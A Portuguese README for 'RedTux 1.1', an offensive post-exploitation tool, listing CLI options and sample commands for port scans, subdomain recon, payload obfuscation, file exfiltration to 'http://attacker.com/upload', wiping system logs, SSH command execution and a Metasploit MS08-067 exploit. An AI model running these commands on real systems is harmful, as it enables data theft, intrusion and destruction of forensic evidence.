# 🧨 RedTux 1.1

**RedTux 1.1** é uma ferramenta de pós-exploração e reconhecimento ofensivo desenvolvida para auxiliar profissionais de segurança, pentesters e entusiastas em tarefas automatizadas de ataques, exfiltração, e evasão. Esta nova versão traz melhorias significativas em relação à versão anterior.

## 🚀 Novidades na Versão 1.1

### ✅ Melhorias:
- Uso de **`argparse`** para execução via linha de comando (CLI), substituindo o menu interativo anterior.
- Implementação de **tratamento de erros com `try/except`** e **logs detalhados com `logging`**.
- Suporte visual aprimorado com **Colorama** para uma experiência mais clara e amigável.
- Verificações adicionais para evitar falhas silenciosas.

### ➕ Funcionalidades Adicionadas:
- CLI com parâmetros explícitos para cada função.
- Verificações de dependências ausentes (ex: Pwntools, Impacket).
- Mensagens de erro e sucesso mais detalhadas.
- Verificação da existência de arquivos antes da exfiltração.

### ❌ Funcionalidades Removidas ou Limitadas:
- ❌ **Interface interativa com menus** foi removida — agora o uso é exclusivamente via CLI.
- ⚠️ **Pwntools** está desabilitado por padrão — requer instalação manual do módulo (`pip install pwntools`).
- ⚠️ **SMB Enum** desativado por padrão — requer instalação do `impacket` (`pip install impacket`).

## ⚙️ Funcionalidades Suportadas

| Comando                                | Descrição                                              |
|----------------------------------------|--------------------------------------------------------|
| `--scan <IP>`                          | Realiza scan de portas (21, 22, 80, 443)               |
| `--recon <DOMINIO>`                    | Reconhecimento de subdomínios com Sublist3r           |
| `--payload <STRING>`                   | Ofusca uma string em Base64                           |
| `--exfil <ARQUIVO> <URL>`              | Exfiltra arquivo para servidor remoto via `curl`      |
| `--clear-logs`                         | Apaga logs do sistema local                           |
| `--ssh <IP> <USUARIO> <SENHA> <CMD>`   | Executa comandos via SSH remoto                       |
| `--smb <IP> <USUARIO> <SENHA>`         | Enumera compartilhamentos SMB (requer Impacket)       |
| `--exploit <BINÁRIO>`                  | Executa exploit local com Pwntools (requer módulo)    |
| `--msf <PAYLOAD> <RHOST> <LHOST> <LPORT>` | Executa exploit via Metasploit RPC                   |

## 🛠️ Como Usar

### Instalação de Dependências Recomendadas
```bash
pip install colorama paramiko
# Para funções opcionais:
pip install pwntools impacket
```

### Executar uma funcionalidade:
```bash
python redtux\ 1.1.py --scan 192.168.0.1
python redtux\ 1.1.py --recon example.com
python redtux\ 1.1.py --payload "comando malicioso"
python redtux\ 1.1.py --exfil /tmp/dados.txt http://attacker.com/upload
python redtux\ 1.1.py --clear-logs
python redtux\ 1.1.py --ssh 192.168.0.10 root toor "whoami"
python redtux\ 1.1.py --msf windows/smb/ms08_067_netapi 192.168.0.20 192.168.0.5 4444
```

## ⚠️ Avisos

- **Uso restrito:** Ferramenta para fins educacionais e testes em ambientes autorizados.
- **Responsabilidade:** O uso indevido pode ser ilegal. Utilize com ética e responsabilidade.

